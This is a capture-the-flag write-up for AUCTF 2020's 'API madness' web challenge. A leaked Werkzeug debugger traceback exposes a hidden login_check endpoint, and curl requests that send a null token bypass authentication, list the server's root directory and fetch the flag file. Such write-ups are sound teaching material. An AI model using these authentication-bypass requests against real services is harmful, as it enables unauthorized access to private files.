# AUCTF 2020 – API madness

* **Category:** web
* **Points:** 926

## Challenge

> http://challenges.auctf.com:30023
> 
> We are building out our new API. We even have authentication built in!
> 
> Author: shinigami

## Solution

Connecting to `http://challenges.auctf.com:30023` you will get the following message.

```
{
  "NOTE": "For API help visit our help page /static/help", 
  "status": "OK"
}
```

The help page at `http://challenges.auctf.com:30023/static/help` will give you the following information.

```html
<html>
<body>
<center><h1>FTP Server API Help Page</h1></center>
<br>
<br>
<h2>Endpoints</h2>
<p>/api/login - POST</p>
<p>/api/ftp/dir - POST</p>
<p>/api/ftp/get_file - POST</p>
</br>
</br>
<h2>Params</h2>
<p>/api/login - username, password</p>
<p>/ftp/dir - dir</p>
<p>/ftp/get_file - file</p>
</body>
</html>
```

So the following API endpoints are available:
* `/api/login` - `HTTP POST` with `username`, `password` JSON parameters;
* `/api/ftp/dir` - `HTTP POST` with `dir` JSON parameter;
* `/api/ftp/get_file` - `HTTP POST` with `file` JSON parameter.

Using the `/api/login` endpoint an error page will appear.

```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
  "http://www.w3.org/TR/html4/loose.dtd">
<html>
  <head>
    <title>ConnectionError: HTTPConnectionPool(host='10.0.2.8', port=80): Max retries exceeded with url: /api/login_check (Caused by NewConnectionError('&lt;urllib3.connection.HTTPConnection object at 0x7ffff45b4dd0&gt;: Failed to establish a new connection: [Errno 110] Connection timed out',)) // Werkzeug Debugger</title>
    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css"
        type="text/css">
    <!-- We need to make sure this has a favicon so that the debugger does
         not by accident trigger a request to /favicon.ico which might
         change the application state. -->
    <link rel="shortcut icon"
        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=jquery.js"></script>
    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
    <script type="text/javascript">
      var TRACEBACK = 140737215262864,
          CONSOLE_MODE = false,
          EVALEX = true,
          EVALEX_TRUSTED = false,
          SECRET = "OG4SiyCTEaRwR1zKkBzE";
    </script>
  </head>
  <body style="background-color: #fff">
    <div class="debugger">
<h1>requests.exceptions.ConnectionError</h1>
<div class="detail">
  <p class="errormsg">ConnectionError: HTTPConnectionPool(host='10.0.2.8', port=80): Max retries exceeded with url: /api/login_check (Caused by NewConnectionError('&lt;urllib3.connection.HTTPConnection object at 0x7ffff45b4dd0&gt;: Failed to establish a new connection: [Errno 110] Connection timed out',))</p>
</div>
<h2 class="traceback">Traceback <em>(most recent call last)</em></h2>
<div class="traceback">

  <ul><li><div class="frame" id="frame-140737210047568">
  <h4>File <cite class="filename">"/usr/local/lib/python2.7/site-packages/flask/app.py"</cite>,
      line <em class="line">2463</em>,
      in <code class="function">__call__</code></h4>
  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">    </span>def __call__(self, environ, start_response):</pre>
<pre class="line before"><span class="ws">        </span>&quot;&quot;&quot;The WSGI server calls the Flask application object as the</pre>
<pre class="line before"><span class="ws">        </span>WSGI application. This calls :meth:`wsgi_app` which can be</pre>
<pre class="line before"><span class="ws">        </span>wrapped to applying middleware.&quot;&quot;&quot;</pre>
<pre class="line current"><span class="ws">        </span>return self.wsgi_app(environ, start_response)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def __repr__(self):</pre>
<pre class="line after"><span class="ws">        </span>return &quot;&lt;%s %r&gt;&quot; % (self.__class__.__name__, self.name)</pre></div>
</div>

<li><div class="frame" id="frame-140737214819088">
  <h4>File <cite class="filename">"/usr/local/lib/python2.7/site-packages/flask/app.py"</cite>,
      line <em class="line">2449</em>,
      in <code class="function">wsgi_app</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>try:</pre>
<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
<pre class="line before"><span class="ws">                </span>response = self.full_dispatch_request()</pre>
<pre class="line before"><span class="ws">            </span>except Exception as e:</pre>
<pre class="line before"><span class="ws">                </span>error = e</pre>
<pre class="line current"><span class="ws">                </span>response = self.handle_exception(e)</pre>
<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre>
<pre class="line after"><span class="ws">                </span>raise</pre>
<pre class="line after"><span class="ws">            </span>return response(environ, start_response)</pre>
<pre class="line after"><span class="ws">        </span>finally:</pre></div>
</div>

<li><div class="frame" id="frame-140737214819152">
  <h4>File <cite class="filename">"/usr/local/lib/python2.7/site-packages/flask/app.py"</cite>,
      line <em class="line">1866</em>,
      in <code class="function">handle_exception</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span># if we want to repropagate the exception, we can attempt to</pre>
<pre class="line before"><span class="ws">            </span># raise it with the whole traceback in case we can do that</pre>
<pre class="line before"><span class="ws">            </span># (the function was actually called from the except part)</pre>
<pre class="line before"><span class="ws">            </span># otherwise, we just raise the error again</pre>
<pre class="line before"><span class="ws">            </span>if exc_value is e:</pre>
<pre class="line current"><span class="ws">                </span>reraise(exc_type, exc_value, tb)</pre>
<pre class="line after"><span class="ws">            </span>else:</pre>
<pre class="line after"><span class="ws">                </span>raise e</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">        </span>self.log_exception((exc_type, exc_value, tb))</pre>
<pre class="line after"><span class="ws">        </span>server_error = InternalServerError()</pre></div>
</div>

<li><div class="frame" id="frame-140737182617552">
  <h4>File <cite class="filename">"/usr/local/lib/python2.7/site-packages/flask/app.py"</cite>,
      line <em class="line">2446</em>,
      in <code class="function">wsgi_app</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>ctx = self.request_context(environ)</pre>
<pre class="line before"><span class="ws">        </span>error = None</pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>try:</pre>
<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
<pre class="line current"><span class="ws">                </span>response = self.full_dispatch_request()</pre>
<pre class="line after"><span class="ws">            </span>except Exception as e:</pre>
<pre class="line after"><span class="ws">                </span>error = e</pre>
<pre class="line after"><span class="ws">                </span>response = self.handle_exception(e)</pre>
<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre></div>
</div>

<li><div class="frame" id="frame-140737182616784">
  <h4>File <cite class="filename">"/usr/local/lib/python2.7/site-packages/flask/app.py"</cite>,
      line <em class="line">1951</em>,
      in <code class="function">full_dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>request_started.send(self)</pre>
<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
<pre class="line before"><span class="ws">                </span>rv = self.dispatch_request()</pre>
<pre class="line before"><span class="ws">        </span>except Exception as e:</pre>
<pre class="line current"><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def finalize_request(self, rv, from_error_handler=False):</pre>
<pre class="line after"><span class="ws">        </span>&quot;&quot;&quot;Given the return value from a view function this finalizes</pre>
<pre class="line after"><span class="ws">        </span>the request by converting it into a response and invoking the</pre></div>
</div>

<li><div class="frame" id="frame-140737347119056">
  <h4>File <cite class="filename">"/usr/local/lib/python2.7/site-packages/flask/app.py"</cite>,
      line <em class="line">1820</em>,
      in <code class="function">handle_user_exception</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>return self.handle_http_exception(e)</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>handler = self._find_error_handler(e)</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>if handler is None:</pre>
<pre class="line current"><span class="ws">            </span>reraise(exc_type, exc_value, tb)</pre>
<pre class="line after"><span class="ws">        </span>return handler(e)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def handle_exception(self, e):</pre>
<pre class="line after"><span class="ws">        </span>&quot;&quot;&quot;Handle an exception that did not have an error handler</pre>
<pre class="line after"><span class="ws">        </span>associated with it, or that was raised from an error handler.</pre></div>
</div>

<li><div class="frame" id="frame-140737210047696">
  <h4>File <cite class="filename">"/usr/local/lib/python2.7/site-packages/flask/app.py"</cite>,
      line <em class="line">1949</em>,
      in <code class="function">full_dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>self.try_trigger_before_first_request_functions()</pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>request_started.send(self)</pre>
<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
<pre class="line current"><span class="ws">                </span>rv = self.dispatch_request()</pre>
<pre class="line after"><span class="ws">        </span>except Exception as e:</pre>
<pre class="line after"><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def finalize_request(self, rv, from_error_handler=False):</pre></div>
</div>

<li><div class="frame" id="frame-140737214759056">
  <h4>File <cite class="filename">"/usr/local/lib/python2.7/site-packages/flask/app.py"</cite>,
      line <em class="line">1935</em>,
      in <code class="function">dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>getattr(rule, &quot;provide_automatic_options&quot;, False)</pre>
<pre class="line before"><span class="ws">            </span>and req.method == &quot;OPTIONS&quot;</pre>
<pre class="line before"><span class="ws">        </span>):</pre>
<pre class="line before"><span class="ws">            </span>return self.make_default_options_response()</pre>
<pre class="line before"><span class="ws">        </span># otherwise dispatch to the handler for that endpoint</pre>
<pre class="line current"><span class="ws">        </span>return self.view_functions[rule.endpoint](**req.view_args)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def full_dispatch_request(self):</pre>
<pre class="line after"><span class="ws">        </span>&quot;&quot;&quot;Dispatches the request and on top of that performs request</pre>
<pre class="line after"><span class="ws">        </span>pre and postprocessing as well as HTTP exception catching and</pre>
<pre class="line after"><span class="ws">        </span>error handling.</pre></div>
</div>

<li><div class="frame" id="frame-140737210048400">
  <h4>File <cite class="filename">"/web_server.py"</cite>,
      line <em class="line">21</em>,
      in <code class="function">try_login</code></h4>
  <div class="source "><pre class="line before"><span class="ws">    </span>if not request.json or 'username' not in request.json:</pre>
<pre class="line before"><span class="ws">        </span>abort(400)</pre>
<pre class="line before"><span class="ws">    </span>username = request.json['username']</pre>
<pre class="line before"><span class="ws">    </span>password = request.json.get(&quot;password&quot;,&quot;&quot;)</pre>
<pre class="line before"><span class="ws">    </span>login_check = {&quot;username&quot;:username,&quot;password&quot;:password}</pre>
<pre class="line current"><span class="ws">    </span>token = r.post(&quot;http://10.0.2.8/api/login_check&quot;,json=login_check).json()['token']</pre>
<pre class="line after"><span class="ws">    </span>r_data = {&quot;status&quot;:&quot;OK&quot;, &quot;token&quot;:token}</pre>
<pre class="line after"><span class="ws">    </span>return jsonify(r_data)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws"></span>@app.route('/static/help')</pre>
<pre class="line after"><span class="ws"></span>def help_page():</pre></div>
</div>

<li><div class="frame" id="frame-140737210047760">
  <h4>File <cite class="filename">"/usr/local/lib/python2.7/site-packages/requests/api.py"</cite>,
      line <em class="line">112</em>,
      in <code class="function">post</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">    </span>:param \*\*kwargs: Optional arguments that ``request`` takes.</pre>
<pre class="line before"><span class="ws">    </span>:return: :class:`Response &lt;Response&gt;` object</pre>
<pre class="line before"><span class="ws">    </span>:rtype: requests.Response</pre>
<pre class="line before"><span class="ws">    </span>&quot;&quot;&quot;</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line current"><span class="ws">    </span>return request('post', url, data=data, json=json, **kwargs)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws"></span>def put(url, data=None, **kwargs):</pre>
<pre class="line after"><span class="ws">    </span>r&quot;&quot;&quot;Sends a PUT request.</pre>
<pre class="line after"><span class="ws"></span> </pre></div>
</div>

<li><div class="frame" id="frame-140737219802320">
  <h4>File <cite class="filename">"/usr/local/lib/python2.7/site-packages/requests/api.py"</cite>,
      line <em class="line">58</em>,
      in <code class="function">request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">    </span># By using the 'with' statement we are sure the session is closed, thus we</pre>
<pre class="line before"><span class="ws">    </span># avoid leaving sockets open which can trigger a ResourceWarning in some</pre>
<pre class="line before"><span class="ws">    </span># cases, and look like a memory leak in others.</pre>
<pre class="line before"><span class="ws">    </span>with sessions.Session() as session:</pre>
<pre class="line current"><span class="ws">        </span>return session.request(method=method, url=url, **kwargs)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws"></span>def get(url, params=None, **kwargs):</pre>
<pre class="line after"><span class="ws">    </span>r&quot;&quot;&quot;Sends a GET request.</pre>
<pre class="line after"><span class="ws"></span> </pre></div>
</div>

<li><div class="frame" id="frame-140737219805136">
  <h4>File <cite class="filename">"/usr/local/lib/python2.7/site-packages/requests/sessions.py"</cite>,
      line <em class="line">508</em>,
      in <code class="function">request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>send_kwargs = {</pre>
<pre class="line before"><span class="ws">            </span>'timeout': timeout,</pre>
<pre class="line before"><span class="ws">            </span>'allow_redirects': allow_redirects,</pre>
<pre class="line before"><span class="ws">        </span>}</pre>
<pre class="line before"><span class="ws">        </span>send_kwargs.update(settings)</pre>
<pre class="line current"><span class="ws">        </span>resp = self.send(prep, **send_kwargs)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">        </span>return resp</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def get(self, url, **kwargs):</pre>
<pre class="line after"><span class="ws">        </span>r&quot;&quot;&quot;Sends a GET request. Returns :class:`Response` object.</pre></div>
</div>

<li><div class="frame" id="frame-140737293459984">
  <h4>File <cite class="filename">"/usr/local/lib/python2.7/site-packages/requests/sessions.py"</cite>,
      line <em class="line">618</em>,
      in <code class="function">send</code></h4>
  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span># Start time (approximately) of the request</pre>
<pre class="line before"><span class="ws">        </span>start = preferred_clock()</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span># Send the request</pre>
<pre class="line current"><span class="ws">        </span>r = adapter.send(request, **kwargs)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">        </span># Total elapsed time of the request (approximately)</pre>
<pre class="line after"><span class="ws">        </span>elapsed = preferred_clock() - start</pre>
<pre class="line after"><span class="ws">        </span>r.elapsed = timedelta(seconds=elapsed)</pre>
<pre class="line after"><span class="ws"></span> </pre></div>
</div>

<li><div class="frame" id="frame-140737328661136">
  <h4>File <cite class="filename">"/usr/local/lib/python2.7/site-packages/requests/adapters.py"</cite>,
      line <em class="line">508</em>,
      in <code class="function">send</code></h4>
  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">            </span>if isinstance(e.reason, _SSLError):</pre>
<pre class="line before"><span class="ws">                </span># This branch is for urllib3 v1.22 and later.</pre>
<pre class="line before"><span class="ws">                </span>raise SSLError(e, request=request)</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line current"><span class="ws">            </span>raise ConnectionError(e, request=request)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">        </span>except ClosedPoolError as e:</pre>
<pre class="line after"><span class="ws">            </span>raise ConnectionError(e, request=request)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">        </span>except _ProxyError as e:</pre></div>
</div>
</ul>
  <blockquote>ConnectionError: HTTPConnectionPool(host='10.0.2.8', port=80): Max retries exceeded with url: /api/login_check (Caused by NewConnectionError('&lt;urllib3.connection.HTTPConnection object at 0x7ffff45b4dd0&gt;: Failed to establish a new connection: [Errno 110] Connection timed out',))</blockquote>
</div>

<div class="plain">
  <form action="/?__debugger__=yes&amp;cmd=paste" method="post">
    <p>
      <input type="hidden" name="language" value="pytb">
      This is the Copy/Paste friendly version of the traceback.  <span
      class="pastemessage">You can also paste this traceback into
      a <a href="https://gist.github.com/">gist</a>:
      <input type="submit" value="create paste"></span>
    </p>
    <textarea cols="50" rows="10" name="code" readonly>Traceback (most recent call last):
  File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 2463, in __call__
    return self.wsgi_app(environ, start_response)
  File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 2449, in wsgi_app
    response = self.handle_exception(e)
  File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 1866, in handle_exception
    reraise(exc_type, exc_value, tb)
  File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 2446, in wsgi_app
    response = self.full_dispatch_request()
  File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 1951, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 1820, in handle_user_exception
    reraise(exc_type, exc_value, tb)
  File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 1949, in full_dispatch_request
    rv = self.dispatch_request()
  File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 1935, in dispatch_request
    return self.view_functions[rule.endpoint](**req.view_args)
  File &quot;/web_server.py&quot;, line 21, in try_login
    token = r.post(&quot;http://10.0.2.8/api/login_check&quot;,json=login_check).json()['token']
  File &quot;/usr/local/lib/python2.7/site-packages/requests/api.py&quot;, line 112, in post
    return request('post', url, data=data, json=json, **kwargs)
  File &quot;/usr/local/lib/python2.7/site-packages/requests/api.py&quot;, line 58, in request
    return session.request(method=method, url=url, **kwargs)
  File &quot;/usr/local/lib/python2.7/site-packages/requests/sessions.py&quot;, line 508, in request
    resp = self.send(prep, **send_kwargs)
  File &quot;/usr/local/lib/python2.7/site-packages/requests/sessions.py&quot;, line 618, in send
    r = adapter.send(request, **kwargs)
  File &quot;/usr/local/lib/python2.7/site-packages/requests/adapters.py&quot;, line 508, in send
    raise ConnectionError(e, request=request)
ConnectionError: HTTPConnectionPool(host='10.0.2.8', port=80): Max retries exceeded with url: /api/login_check (Caused by NewConnectionError('&lt;urllib3.connection.HTTPConnection object at 0x7ffff45b4dd0&gt;: Failed to establish a new connection: [Errno 110] Connection timed out',))</textarea>
  </form>
</div>
<div class="explanation">
  The debugger caught an exception in your WSGI application.  You can now
  look at the traceback which led to the error.  <span class="nojavascript">
  If you enable JavaScript you can also use additional features such as code
  execution (if the evalex feature is enabled), automatic pasting of the
  exceptions and much more.</span>
</div>
      <div class="footer">
        Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
        friendly Werkzeug powered traceback interpreter.
      </div>
    </div>

    <div class="pin-prompt">
      <div class="inner">
        <h3>Console Locked</h3>
        <p>
          The console is locked and needs to be unlocked by entering the PIN.
          You can find the PIN printed out on the standard output of your
          shell that runs the server.
        <form>
          <p>PIN:
            <input type=text name=pin size=14>
            <input type=submit name=btn value="Confirm Pin">
        </form>
      </div>
    </div>
  </body>
</html>

<!--

Traceback (most recent call last):
  File "/usr/local/lib/python2.7/site-packages/flask/app.py", line 2463, in __call__
    return self.wsgi_app(environ, start_response)
  File "/usr/local/lib/python2.7/site-packages/flask/app.py", line 2449, in wsgi_app
    response = self.handle_exception(e)
  File "/usr/local/lib/python2.7/site-packages/flask/app.py", line 1866, in handle_exception
    reraise(exc_type, exc_value, tb)
  File "/usr/local/lib/python2.7/site-packages/flask/app.py", line 2446, in wsgi_app
    response = self.full_dispatch_request()
  File "/usr/local/lib/python2.7/site-packages/flask/app.py", line 1951, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/usr/local/lib/python2.7/site-packages/flask/app.py", line 1820, in handle_user_exception
    reraise(exc_type, exc_value, tb)
  File "/usr/local/lib/python2.7/site-packages/flask/app.py", line 1949, in full_dispatch_request
    rv = self.dispatch_request()
  File "/usr/local/lib/python2.7/site-packages/flask/app.py", line 1935, in dispatch_request
    return self.view_functions[rule.endpoint](**req.view_args)
  File "/web_server.py", line 21, in try_login
    token = r.post("http://10.0.2.8/api/login_check",json=login_check).json()['token']
  File "/usr/local/lib/python2.7/site-packages/requests/api.py", line 112, in post
    return request('post', url, data=data, json=json, **kwargs)
  File "/usr/local/lib/python2.7/site-packages/requests/api.py", line 58, in request
    return session.request(method=method, url=url, **kwargs)
  File "/usr/local/lib/python2.7/site-packages/requests/sessions.py", line 508, in request
    resp = self.send(prep, **send_kwargs)
  File "/usr/local/lib/python2.7/site-packages/requests/sessions.py", line 618, in send
    r = adapter.send(request, **kwargs)
  File "/usr/local/lib/python2.7/site-packages/requests/adapters.py", line 508, in send
    raise ConnectionError(e, request=request)
ConnectionError: HTTPConnectionPool(host='10.0.2.8', port=80): Max retries exceeded with url: /api/login_check (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7ffff45b4dd0>: Failed to establish a new connection: [Errno 110] Connection timed out',))

-->
```

The error will leak `http://challenges.auctf.com:30023/api/login_check` endpoint. Trying to use it, you will get a "null token".

```
$ curl -X POST -H "Content-Type: application/json" -d '{"username":"m3ssap0","password":"password"}' http://challenges.auctf.com:30023/api/login_check
{
  "token": null
}
```

This "token" can be used to authenticate on other endpoints to discover and retrieve the flag file (i.e. *Broken Authentication* vulnerability in *OWASP Top 10*).

```
$ curl -X POST -H "Content-Type: application/json" -d '{"dir":".", "token":null}' http://challenges.auctf.com:30023/api/ftp/dir
{
  "dir": [
    ".dockerenv",
    "bin",
    "boot",
    "dev",
    "etc",
    "flag.txt",
    "ftp_server.py",
    "home",
    "lib",
    "lib64",
    "media",
    "mnt",
    "opt",
    "proc",
    "root",
    "run",
    "sbin",
    "srv",
    "startup.sh",
    "sys",
    "templates",
    "tmp",
    "usr",
    "var",
    "web_server.py"
  ],
  "status": "OK"
}

$ curl -X POST -H "Content-Type: application/json" -d '{"file":"flag.txt", "token":null}' http://challenges.auctf.com:30023/api/ftp/get_file
{
  "file_data": "YXVjdGZ7MHdAc3BfNnJvSzNOX0B1dGh9Cg==\n",
  "status": "OK"
}
```

The data is base64 encoded (`YXVjdGZ7MHdAc3BfNnJvSzNOX0B1dGh9Cg==`); decoding it you will find the flag.

```
auctf{0w@sp_6roK3N_@uth}
```